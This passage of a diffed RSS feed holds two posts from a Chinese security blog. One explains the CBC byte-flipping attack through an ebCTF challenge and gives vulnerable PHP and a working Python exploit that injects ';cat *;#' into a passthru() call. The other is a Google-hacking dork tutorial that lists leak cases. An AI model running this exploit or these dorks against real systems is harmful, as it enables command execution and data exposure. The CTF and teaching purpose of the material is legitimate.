+&lt;/ul&gt;
+
+&lt;p&gt;注意：&lt;strong&gt;&lt;em&gt;Ciphertext-N-1&lt;/em&gt;（密文-N-1）是用来产生下一块明文&lt;/strong&gt;；这就是字节翻转攻击开始发挥作用的地方。如果我们改变&lt;em&gt;Ciphertext-N-1&lt;/em&gt;（密文-N-1）的一个字节，然后与下一个解密后的组块异或，我们就可以得到一个不同的明文了！&lt;strong&gt;You got it?&lt;/strong&gt;别担心，下面我们将看到一个详细的例子。与此同时，下面的这张图也可以很好地说明这种攻击：
+&lt;img src=&quot;http://ojyzyrhpd.bkt.clouddn.com/20150808/attack.jpg&quot; alt=&quot;attack&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;x02-cbc-blocks-of-16-bytes&quot;&gt;0x02 一个例子（CBC Blocks of 16 bytes）&lt;/h2&gt;
+
+&lt;p&gt;比方说，我们有这样的明文序列：&lt;/p&gt;
+
+&lt;p&gt;&lt;code&gt;a:2:{s:4:&quot;name&quot;;s:6:&quot;sdsdsd&quot;;s:8:&quot;greeting&quot;;s:20:&quot;echo 'Hello sdsdsd!'&quot;;}&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;我们的目标是将“&lt;code&gt;s:6&lt;/code&gt;”当中的数字6转换成数字“7”。我们需要做的第一件事就是把明文分成16个字节的块：&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Block 1:&lt;code&gt;a:2:{s:4:&quot;name&quot;;&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;Block 2:&lt;code&gt;s:6:&quot;sdsdsd&quot;;s:8&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;Block 3:&lt;code&gt;:&quot;greeting&quot;;s:20&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;Block 4:&lt;code&gt;:&quot;echo 'Hello sd&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;Block 5:&lt;code&gt;sdsd!'&quot;;}&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;因此，我们的目标字符位于块2，这意味着我们需要改变块1的密文来改变第二块的明文。&lt;/p&gt;
+
+&lt;p&gt;有一条经验法则是（注：结合上面的说明图可以得到），你在密文中改变的字节，&lt;strong&gt;只&lt;/strong&gt;会影响到在下一明文当中，具有相同偏移量的字节。所以我们目标的偏移量是2：&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;[0] = s&lt;/li&gt;
+  &lt;li&gt;[1] = :&lt;/li&gt;
+  &lt;li&gt;[2] =6&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;因此我们要改变在第一个密文块当中，偏移量是2的字节。正如你在下面的代码当中看到的，在第2行我们得到了整个数据的密文，然后在第3行中，我们改变块1中偏移量为2的字节，最后我们再调用解密函数。&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;&lt;code&gt;$v = &quot;a:2:{s:4:&quot;name&quot;;s:6:&quot;sdsdsd&quot;;s:8:&quot;greeting&quot;;s:20:&quot;echo 'Hello sdsdsd!'&quot;;}&quot;;&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;code&gt;$enc = @encrypt($v);&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;code&gt;$enc[2] = chr(ord($enc[2]) ^ ord(&quot;6&quot;) ^ ord (&quot;7&quot;));&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;code&gt;$b = @decrypt($enc);&lt;/code&gt;&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;运行这段代码后，我们可以将数字6变为7：
+&lt;img src=&quot;http://ojyzyrhpd.bkt.clouddn.com/20150808/pic1.png&quot; alt=&quot;pic1&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;但是我们在第3行中，是如何改变字节成为我们想要的值呢？&lt;/p&gt;
+
+&lt;p&gt;基于上述的解密过程，我们知道有，&lt;em&gt;A = Decrypt(Ciphertext)&lt;/em&gt;与&lt;em&gt;B = Ciphertext-N-1&lt;/em&gt;异或后最终得到&lt;em&gt;C = 6&lt;/em&gt;。等价于：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;C = A XOR B
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;所以，我们唯一不知道的值就是A（注：对于B，C来说）（&lt;em&gt;block cipher decryption&lt;/em&gt;）;借由XOR，我们可以很轻易地得到A的值：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;A = B XOR C
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;最后，A XOR B XOR C等于0。有了这个公式，我们可以在XOR运算的末尾处设置我们自己的值，就像这样：&lt;/p&gt;
+
+&lt;p&gt;&lt;code&gt;A XOR B XOR C XOR &quot;7&quot; &lt;/code&gt;会在块2的明文当中，偏移量为2的字节处得到7。&lt;/p&gt;
+
+&lt;p&gt;下面是相关原理实现的PHP源代码：&lt;/p&gt;
+
+&lt;div&gt;
+  &lt;pre&gt;&lt;code class=&quot;php&quot;&gt;&amp;lt;?php
+define('MY_AES_KEY', &amp;quot;abcdef0123456789&amp;quot;);
+function aes($data, $encrypt) {
+    $aes = mcrypt_module_open(MCRYPT_RIJNDAEL_128, '', MCRYPT_MODE_CBC, '');
+    $iv = &amp;quot;1234567891234567&amp;quot;;
+    mcrypt_generic_init($aes, MY_AES_KEY, $iv);
+    return $encrypt ? mcrypt_generic($aes,$data) : mdecrypt_generic($aes,$data);
+}
+define('MY_MAC_LEN', 40);
+function encrypt($data) {
+    return aes($data, true);
+}
+function decrypt($data) {
+    $data = rtrim(aes($data, false), &amp;quot;\0&amp;quot;);
+    return $data;
+}
+$v = &amp;quot;a:2:{s:4:\&amp;quot;name\&amp;quot;;s:6:\&amp;quot;sdsdsd\&amp;quot;;s:8:\&amp;quot;greeting\&amp;quot;;s:20:\&amp;quot;echo 'Hello sdsdsd!'\&amp;quot;;}&amp;quot;;
+echo &amp;quot;Plaintext before attack: $v\n&amp;quot;;
+$b = array();
+$enc = array();
+$enc = @encrypt($v);
+$enc[2] =  chr(ord($enc[2]) ^ ord(&amp;quot;6&amp;quot;) ^ ord (&amp;quot;7&amp;quot;));
+$b = @decrypt($enc);
+echo &amp;quot;Plaintext AFTER attack : $b\n&amp;quot;;
+?&amp;gt;&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h1 id=&quot;x03-&quot;&gt;0x03 一个练习&lt;/h1&gt;
+
+&lt;hr /&gt;
+
+&lt;p&gt;光说不练假把式，接下来作者举了一个他参加过的CTF中的一道题目的例子（更多详情可以参阅最后的相关参考链接），然后阐述了他是怎样在最后几步中打破CBC的。&lt;/p&gt;
+
+&lt;p&gt;下面提供了这个练习当中很重要的一部分源码：
+&lt;img src=&quot;http://ojyzyrhpd.bkt.clouddn.com/20150808/pic2.png&quot; alt=&quot;pic2&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;其中，你在POST提交参数”name”的任何文本值之后，应用程序则会对应输出”Hello”加上最后提交的文本。但是有两件事情发生在消息打印之前：&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;POST参数”name”值被PHP函数escapeshellarg()过滤（转换单引号，防止恶意命令注入），然后将其存储在Array-&amp;gt;greeting当中，最后加密该值来产生cookie。&lt;/li&gt;
+  &lt;li&gt;Array-&amp;gt;greeting当中的内容被PHP函数passthru()执行。&lt;/li&gt;
+  &lt;li&gt;最后，在页面被访问的任何时间中，如果cookie已经存在，它会被解密，它的内容会通过passthru()函数执行。如前节所述，在这里CBC攻击会给我们一个不同的明文。&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;然后作者构造了一个POST”name”的值来注入字符串：&lt;/p&gt;
+
+&lt;div&gt;
+  &lt;pre&gt;&lt;code class=&quot;python&quot;&gt;name = 'X' + ';cat *;#a'&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;首先作者添加了一个字符”X”，通过CBC翻转攻击将其替换成一个单引号，然后&lt;code&gt;;cat *;&lt;/code&gt;命令将被执行，最后的&lt;code&gt;#&lt;/code&gt;是用来注释，确保函数escapeshellarg()插入的单引号不会引起其他问题；因此我们的命令就被成功执行啦。&lt;/p&gt;
+
+&lt;p&gt;在计算好之前的密码块中，要被改变的字节的确切偏移量（51）后，作者通过下面的代码来注入单引号：&lt;/p&gt;
+
+&lt;div&gt;
+  &lt;pre&gt;&lt;code class=&quot;python&quot;&gt;pos = 51;
+val = chr(ord('X') ^ ord(&amp;quot;'&amp;quot;) ^ ord(cookie[pos]))
+exploit = cookie[0:pos] + val + cookie[pos + 1:]&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;然后作者通过改变cookie（因为其具有全部的密文），得到以下结果：
+&lt;img src=&quot;http://ojyzyrhpd.bkt.clouddn.com/20150808/pic3.png&quot; alt=&quot;pic3&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;首先，因为我们改变了第一块，所以在第二块中，黄色标记的”X”被成功替换为单引号，它被认为是多余插入（绿色），导致在unserialize()处理数据时产生一个错误（红色），因此应用程序甚至都没有去尝试执行注入了。&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;如何完善&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;我们需要使我们的注入数据有效，那么我们在第一块中得到的额外数据，就不能在反序列化的过程中造成任何问题（unserialize()）。一种方法是在我们的恶意命令中填充字母字符。因此我们尝试在注入字符串前后填充多个’z’：&lt;/p&gt;
+
+&lt;div&gt;
+  &lt;pre&gt;&lt;code class=&quot;python&quot;&gt;name = 'z'*17 + 'X' + ';cat *;#' + 'z'*16&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;在发送上述字符串后，unserialize()并没有报错，并且我们的shell命令成功执行！！！&lt;/p&gt;
+
+&lt;h1 id=&quot;x04-&quot;&gt;0x04 相关参考&lt;/h1&gt;
+
+&lt;hr /&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;CRYPTO #2: http://blog.gdssecurity.com/labs/tag/crypto&lt;/li&gt;
+  &lt;li&gt;http://codezen.fr/2013/08/05/ebctf-2013-web400-cryptoaescbchmac-write-up/&lt;/li&gt;
+  &lt;li&gt;http://hardc0de.ru/2013/08/04/ebctf-web400/&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;h1 id=&quot;x05-&quot;&gt;0x05 附录代码&lt;/h1&gt;
+
+&lt;hr /&gt;
+
+&lt;p&gt;下面是上面练习当中的PHP源码及exp：&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;PHP code:&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div&gt;
+  &lt;pre&gt;&lt;code class=&quot;php&quot;&gt;&amp;lt;?php     
+ini_set('display_errors',1);
+error_reporting(E_ALL);
+ 
+define('MY_AES_KEY', &amp;quot;abcdef0123456789&amp;quot;);
+define('MY_HMAC_KEY',&amp;quot;1234567890123456&amp;quot; );
+#define(&amp;quot;FLAG&amp;quot;,&amp;quot;CENSORED&amp;quot;);
+ 
+function aes($data, $encrypt) {
+    $aes = mcrypt_module_open(MCRYPT_RIJNDAEL_128, '', MCRYPT_MODE_CBC, '');
+    $iv = mcrypt_create_iv (mcrypt_enc_get_iv_size($aes), MCRYPT_RAND);
+    $iv = &amp;quot;1234567891234567&amp;quot;;
+    mcrypt_generic_init($aes, MY_AES_KEY, $iv);
+    return $encrypt ? mcrypt_generic($aes, $data) : mdecrypt_generic($aes, $data);
+}
+ 
+define('MY_MAC_LEN', 40);
+ 
+function hmac($data) {
+    return hash_hmac('sha1', data, MY_HMAC_KEY);
+}
+ 
+function encrypt($data) {
+    return aes($data . hmac($data), true);
+}
+ 
+function decrypt($data) {
+    $data = rtrim(aes($data, false), &amp;quot;\0&amp;quot;);
+    $mac = substr($data, -MY_MAC_LEN);
+    $data = substr($data, 0, -MY_MAC_LEN);
+    return hmac($data) === $mac ? $data : null;
+}
+$settings = array();
+if (@$_COOKIE['settings']) {
+        echo @decrypt(base64_decode($_COOKIE['settings']));
+        $settings = unserialize(@decrypt(base64_decode($_COOKIE['settings'])));
+}
+if (@$_POST['name'] &amp;amp;&amp;amp; is_string($_POST['name']) &amp;amp;&amp;amp; strlen($_POST['name']) &amp;lt; 200) {
+    $settings = array(
+            'name' =&amp;gt; $_POST['name'],
+            'greeting' =&amp;gt; ('echo ' . escapeshellarg(&amp;quot;Hello {$_POST['name']}!&amp;quot;)),
+    );
+    setcookie('settings', base64_encode(@encrypt(serialize($settings))));
+    #setcookie('settings', serialize($settings));
+}
+$d = array();
+if (@$settings['greeting']) {
+    passthru($settings['greeting']);
+else {
+    echo &amp;quot;&amp;lt;/pre&amp;gt;
+&amp;lt;form action=&amp;quot;\&amp;amp;quot;?\&amp;amp;quot;&amp;quot; method=&amp;quot;\&amp;amp;quot;POST\&amp;amp;quot;&amp;quot;&amp;gt;\n&amp;quot;;
+ echo &amp;quot;
+What is your name?
+ 
+\n&amp;quot;;
+ echo &amp;quot;&amp;lt;input type=&amp;quot;\&amp;amp;quot;text\&amp;amp;quot;&amp;quot; name=&amp;quot;\&amp;amp;quot;name\&amp;amp;quot;&amp;quot; /&amp;gt;\n&amp;quot;;
+ echo &amp;quot;&amp;lt;input type=&amp;quot;\&amp;amp;quot;submit\&amp;amp;quot;&amp;quot; name=&amp;quot;\&amp;amp;quot;submit\&amp;amp;quot;&amp;quot; value=&amp;quot;\&amp;amp;quot;Submit\&amp;amp;quot;&amp;quot; /&amp;gt;\n&amp;quot;;
+ echo &amp;quot;&amp;lt;/form&amp;gt;
+&amp;lt;pre&amp;gt;
+\n&amp;quot;;
+}
+?&amp;gt;&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Exploit:&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div&gt;
+  &lt;pre&gt;&lt;code class=&quot;python&quot;&gt;#!/usr/bin/python
+import requests
+import sys
+import urllib
+from base64 import b64decode as dec
+from base64 import b64encode as enc
+ 
+url = 'http://192.168.184.133/ebctf/mine.php'
+ 
+def Test(x):
+    t = &amp;quot;echo 'Hello %s!'&amp;quot; % x
+    s = 'a:2:{s:4:&amp;quot;name&amp;quot;;s:%s:&amp;quot;%s&amp;quot;;s:8:&amp;quot;greeting&amp;quot;;s:%s:&amp;quot;%s&amp;quot;;}%s' % (len(x),x,len(t),t, 'X'*40)
+    for i in xrange(0,len(s),16):
+        print s[i:i+16]
+    print '\n'
+ 
+def Pwn(s):
+    global url
+    s = urllib.quote_plus(enc(s))
+    req = requests.get(url, cookies = {'settings' : s}).content
+ #   if req.find('works') != -1:
+    print req
+  #  else:
+   #     print '[-] FAIL'
+ 
+def GetCookie(name):
+    global url
+    d = {
+        'name':name,
+        'submit':'Submit'
+    }
+    h = requests.post(url, data = d, headers = {'Content-Type' : 'application/x-www-form-urlencoded'}).headers
+    if h.has_key('set-cookie'):
+        h = dec(urllib.unquote_plus(h['set-cookie'][9:]))
+        #h = urllib.unquote_plus(h['set-cookie'][9:])
+        #print h
+        return h
+    else:
+        print '[-] ERROR'
+        sys.exit(0)
+ 
+#a:2:{s:4:&amp;quot;name&amp;quot;;s:10:&amp;quot;X;cat *;#a&amp;quot;;s:8:&amp;quot;greeting&amp;quot;;s:24:&amp;quot;echo 'Hello X;cat *;#a!'&amp;quot;;}
+#a:2:{s:4:&amp;quot;name&amp;quot;;
+#s:10:&amp;quot;X;cat *;#a
+#&amp;quot;;s:8:&amp;quot;greeting&amp;quot;
+#;s:24:&amp;quot;echo 'Hel
+#lo X;cat *;#a!'&amp;quot;
+#;}
+ 
+#a:2:{s:4:&amp;quot;name&amp;quot;;s:42:&amp;quot;zzzzzzzzzzzzzzzzzX;cat *;#zzzzzzzzzzzzzzzz&amp;quot;;s:8:&amp;quot;greeting&amp;quot;;s:56:&amp;quot;echo 'Hello zzzzzzzzzzzzzzzzzX;cat *;#zzzzzzzzzzzzzzzz!'&amp;quot;;}
+#a:2:{s:4:&amp;quot;name&amp;quot;;
+#s:42:&amp;quot;zzzzzzzzzz
+#zzzzzzzX;cat *;#
+#zzzzzzzzzzzzzzzz
+#&amp;quot;;s:8:&amp;quot;greeting&amp;quot;
+#;s:56:&amp;quot;echo 'Hel
+#lo zzzzzzzzzzzzz
+#zzzzX;cat *;#zzz
+#zzzzzzzzzzzzz!'&amp;quot;
+#;}
+#exploit = 'X' + ';cat *;#a' #Test case first, unsuccess
+exploit = 'z'*17 + 'X' + ';cat *;#' + 'z' *16 # Test Success
+ 
+#exploit = &amp;quot;______________________________________________________; cat *;#&amp;quot;
+#Test(exploit)
+cookie = GetCookie(exploit)
+pos = 100; #test case success
+#pos = 51; #test case first, unsuccess
+val = chr(ord('X') ^ ord(&amp;quot;'&amp;quot;) ^ ord(cookie[pos]))
+exploit = cookie[0:pos] + val + cookie[pos + 1:]
+Pwn(exploit)&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
 </description>
         
-        <pubDate>Sat, 08 Aug 2015 14:30:00 -0400</pubDate>
+        <pubDate>Sun, 09 Aug 2015 02:30:00 +0800</pubDate>
         <link>
         https://larryxi.github.io/cbc-byte-flipping-attack-101-approach-studying.html</link>
         <guid isPermaLink="true">https://larryxi.github.io/cbc-byte-flipping-attack-101-approach-studying.html</guid>
@@ -1342,9 +3241,152 @@ patching file ext/simplexml/simplexml.c
         
           <description>&lt;h1 id=&quot;x00-&quot;&gt;0x00 引言&lt;/h1&gt;
 
+&lt;hr /&gt;
+
+&lt;p&gt;“无用信息输入，无用信息输出”，本文适当总结脚本小子的Google Hacking方法未涉及脚本自动化处理数据，翻墙请自备，大神请轻喷。鄙人觉得也应当配合不同的搜索引擎使用相应的搜索语法组合出最佳的结果，当然可以由自动化工具实现或学习相关*HDB进行手工搜索。(下文中“===”代表搜索结果相同)&lt;/p&gt;
+
+&lt;!--more--&gt;
+
+&lt;h1 id=&quot;x01-google&quot;&gt;0x01 Google搜索基础知识&lt;/h1&gt;
+
+&lt;hr /&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;手气不错，自定义搜索结果，语言设置，高级设置大家都懂哈 
+&lt;img src=&quot;http://ojyzyrhpd.bkt.clouddn.com/20150328/1.png&quot; alt=&quot;Example&quot; /&gt;&lt;/li&gt;
+  &lt;li&gt;基本搜素：一个或一组单词(google hacker);双引号封装的词组(“Google Hacking”)&lt;/li&gt;
+  &lt;li&gt;Google搜索的黄金法则： 
+    &lt;ul&gt;
+      &lt;li&gt;Google查询不区分大小写：hack === HAck 但单词or作为布尔操作符时必须为大写就，即OR &lt;/li&gt;
+      &lt;li&gt;Google通配符：星号(*)仅代表搜索词组中的一个词。（注意与表示任意单一字母的词干提取技术相区别）&lt;/li&gt;
+      &lt;li&gt;Google保留忽略查询关键字的权利(哪些关键字会被忽略呢 &lt;a href=&quot;https://code.google.com/p/stop-words/&quot;&gt;Link&lt;/a&gt;):(how 1 = WHERE 4) === (1 = WHERE 4) 两者搜索结果相同。如何突破？搜索”how” 1 = WHERE 4即可  &lt;/li&gt;
+      &lt;li&gt;32个单词的限制：突破方法：使用通配符(*)来代替某些单词。Google不认为通配符是一个查询项，这使得我们能够稍稍扩展查询. &lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;使用布尔操作符和特殊字符： 
+    &lt;ul&gt;
+      &lt;li&gt;AND：用于在查询中包含多个关键字。例如：hacker AND cracker。但AND关键字对于Google来说是多余的。默认情况下，Google会自动搜索查询中的所有关键字。加号(+)强制Google搜索它后面的单词。在加号后面不得有空格，用于强制搜索被忽略的单词，例如：+and justice for +all。当然，也可以使用双引号构建查询，即”and justice for all” &lt;/li&gt;
+      &lt;li&gt;NOT：用于在查询中忽略一个单词。也可以使用减号(-)达到相应效果，在减号和搜索关键字之间不能有空格。例如：hacker -golf &lt;/li&gt;
+      &lt;li&gt;OR：用于查找搜索中的一个或者另外一个关键字。也可以使用管道符号(|)达到相应效果。例如：admin | user &lt;/li&gt;
+      &lt;li&gt;注意：Google从左到右读取查询，操作符之间拥有相同优先级，且搜索不受括号影响。例如：intext:(password | passcode) intext:(username | userid | user) filetype:csv &lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;使用Google URL:
+ 当你提交完一个Google查询之后，可以看到相应的Google结果页面，而这个页面的URL可以用于修改一个查询的或者在以后重新使用这个查询 &lt;br /&gt;
+ 例如：www.google.com.hk/search?variable1=value&amp;amp;variable2=value&lt;br /&gt;
+ 相关URL参数列表 &lt;a href=&quot;http://ylbook.com/cms/web/gugecanshu.htm&quot;&gt;Link&lt;/a&gt;&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;h1 id=&quot;x02-google&quot;&gt;0x02 Google高级操作符&lt;/h1&gt;
+
+&lt;hr /&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;操作符语法：
+    &lt;ul&gt;
+      &lt;li&gt;基本语法：opearator:search_term&lt;/li&gt;
+      &lt;li&gt;在操作符、冒号、搜索关键字之间是没有空格的。&lt;/li&gt;
+      &lt;li&gt;布尔操作符和特殊字符（例如OR和+）仍可用于高级操作符查询，但是不能把它们放在冒号之前二把冒号和操作符分开。&lt;/li&gt;
+      &lt;li&gt;高级操作符能够和单独的查询混合使用，但是必须遵循基本Google查询语法和高级操作符语法。&lt;/li&gt;
+      &lt;li&gt;一般情况下，一个查询只能使用一次ALL操作符，而且不能和其他操作符混用。&lt;/li&gt;
+      &lt;li&gt;例如：intitle:”index of” private  这个查询将返回标题包含词组index of，而且网页的任何地方（URL、标题、文本等）包含单词private的页面。要注意的是，intitle只对词组index of起作用，而不会影响单词private，这是因为引号外的第一个空格位于词组index of之后。Google吧这个空格解释为高级操作符搜索关键字的结尾，然后接着处理查询中剩下的部分。 &lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Google高级操作符（列举常用的）：
+    &lt;ul&gt;
+      &lt;li&gt;intitle: 在页面标题中查找字符串&lt;/li&gt;
+      &lt;li&gt;allintitle: 在页面标题中查找所有的关键字&lt;/li&gt;
+      &lt;li&gt;inurl: 在页面的URL中查找字符串&lt;/li&gt;
+      &lt;li&gt;allinurl: 在页面的URL中查找所有的关键字&lt;/li&gt;
+      &lt;li&gt;filetype: 根据文件扩展名查找特定类型的 文件，等同于ext，也需要附加搜索关键字&lt;/li&gt;
+      &lt;li&gt;site: 限定在某个特定的网站或者域搜索，也可以单独使用&lt;/li&gt;
+      &lt;li&gt;cache: 现实页面的缓存版本，但不能很好地与其他操作符或者关键字混合使用 &lt;br /&gt;
+ &lt;img src=&quot;http://ojyzyrhpd.bkt.clouddn.com/20150328/2.png&quot; alt=&quot;example&quot; /&gt;&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;h1 id=&quot;x03-google-hacking-wooyun&quot;&gt;0x03 Google Hacking Wooyun案例：&lt;/h1&gt;
+
+&lt;hr /&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;具体的Google Hacking一般性练手：
+    &lt;ul&gt;
+      &lt;li&gt;&lt;a href=&quot;http://www.wooyun.org/bugs/wooyun-2012-06968&quot;&gt;WooYun: 关于Google Hacking一些Tips&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;http://www.wooyun.org/bugs/wooyun-2013-017368&quot;&gt;WooYun: 万达集团某处未授权任意浏览MM、GG信息&lt;/a&gt;&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;利用网页快照收集信息，当然也可以用于匿名浏览：
+    &lt;ul&gt;
+      &lt;li&gt;&lt;a href=&quot;http://www.wooyun.org/bugs/wooyun-2014-086085&quot;&gt;WooYun: 某校服供应商sql注入漏洞导致数万学生信息泄漏极详细另带shell&lt;/a&gt;&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;配置文件或日志文件敏感信息泄露：
+    &lt;ul&gt;
+      &lt;li&gt;&lt;a href=&quot;http://www.wooyun.org/bugs/wooyun-2013-020012&quot;&gt;WooYun: 多家单位深信服设备敏感文件下载(补丁不及时),可成功控制设备  (3)  —大结局&lt;/a&gt;&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;office文档包含用户名、口令等敏感信息泄露：
+    &lt;ul&gt;
+      &lt;li&gt;&lt;a href=&quot;http://www.wooyun.org/bugs/wooyun-2014-087891&quot;&gt;WooYun: 瑞金市教育局视频会议账号及管理员名单泄露&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;http://www.wooyun.org/bugs/wooyun-2014-051023&quot;&gt;WooYun: TCL集团技术信息服务平台用户信息泄露(弱口令登录)&lt;/a&gt;&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;数据库挖掘配合不当配置：
+    &lt;ul&gt;
+      &lt;li&gt;&lt;a href=&quot;http://www.wooyun.org/bugs/wooyun-2014-055361&quot;&gt;WooYun: 国内某大学网站phpmyadmin配置不当，导致可通过google hack以root权限管理后台&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;http://www.wooyun.org/bugs/wooyun-2014-085697&quot;&gt;WooYun: 4399某游戏MONGOD泄露影响归纳（敏感数据库信息）&lt;/a&gt;&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;利用已有漏洞进行Google挖掘：
+    &lt;ul&gt;
+      &lt;li&gt;&lt;a href=&quot;http://www.wooyun.org/bugs/wooyun-2014-067058&quot;&gt;WooYun: 盛大网络旗下多个站点SQL注入打包&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;http://www.wooyun.org/bugs/wooyun-2014-081513&quot;&gt;WooYun: 万户OA未修补漏洞致多个政府&amp;amp;集团OA中招&lt;/a&gt;&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;相关网络设备泄露登陆入口及信息：
+    &lt;ul&gt;
+      &lt;li&gt;&lt;a href=&quot;http://www.wooyun.org/bugs/wooyun-2014-089042&quot;&gt;WooYun: 禹神国际酒店出现漏洞，可更改支付平台账号&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;http://www.wooyun.org/bugs/wooyun-2012-07282&quot;&gt;WooYun: 阿里FTP密码泄漏&lt;/a&gt;&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;搜索引擎爬行的那些事：
+    &lt;ul&gt;
+      &lt;li&gt;&lt;a href=&quot;http://www.wooyun.org/bugs/wooyun-2012-08604&quot;&gt;WooYun: 搜搜 搜索引擎越权爬行&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;http://www.wooyun.org/bugs/wooyun-2013-024626&quot;&gt;WooYun: 搜狗输入法泄露部分用户隐私信息&lt;/a&gt; &lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h1 id=&quot;x04-&quot;&gt;0x04 相关防卫措施&lt;/h1&gt;
+
+&lt;hr /&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;禁止目录列表、错误信息和不当的配置或者删除默认页面及配置&lt;/li&gt;
+  &lt;li&gt;设置Robots.txt文件和特殊的META标记阻止Crawler&lt;/li&gt;
+  &lt;li&gt;利用自动化工具和GHDB(Google Hacking Datebase)来检测自己的网站&lt;/li&gt;
+  &lt;li&gt;使用Google的Webmaster删除页面的缓存版本 &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h1 id=&quot;x05-&quot;&gt;0x05 扩展及参考资料&lt;/h1&gt;
+
+&lt;hr /&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;owasp-testing-guide-v4 &lt;a href=&quot;http://kennel209.gitbooks.io/owasp-testing-guide-v4/content/zh/index.html&quot;&gt;Link&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;wiki相关 &lt;a href=&quot;http://en.wikipedia.org/wiki/Google_hacking&quot;&gt;Link&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;Google Hacking技术手册 &lt;a href=&quot;http://baike.baidu.com/link?url=YBxKy0FR6zJnBiGTdk-z8gqw3IqvVcvx9Q0aDY3Ssta8X1wNGVQXhENenxQ1ffSokpoDrHLpGVZ9VQ_7GiMucK&quot;&gt;Link&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;GHDB(Google Hacking Datebase) &lt;a href=&quot;http://www.exploit-db.com/google-dorks/&quot;&gt;Link&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;工具相关：&lt;a href=&quot;http://www.bishopfox.com/resources/tools/google-hacking-diggity/&quot;&gt;Diggity Project&lt;/a&gt; &lt;a href=&quot;http://www.mcafee.com/uk/downloads/free-tools/sitedigger.aspx&quot;&gt;SiteDigger&lt;/a&gt; &lt;a href=&quot;http://yehg.net/lab/pr0js/files.php/googlehacker.zip&quot;&gt;Google Hacker&lt;/a&gt; &lt;a href=&quot;http://punkspider.hyperiongray.com/&quot;&gt;PunkSPIDER&lt;/a&gt;&lt;/p&gt;
+
+  &lt;/li&gt;
+&lt;/ul&gt;
 </description>
         
-        <pubDate>Fri, 27 Mar 2015 20:38:00 -0400</pubDate>
+        <pubDate>Sat, 28 Mar 2015 08:38:00 +0800</pubDate>
         <link>
         https://larryxi.github.io/basic-google-hacking.html</link>
         <guid isPermaLink="true">https://larryxi.github.io/basic-google-hacking.html</guid>
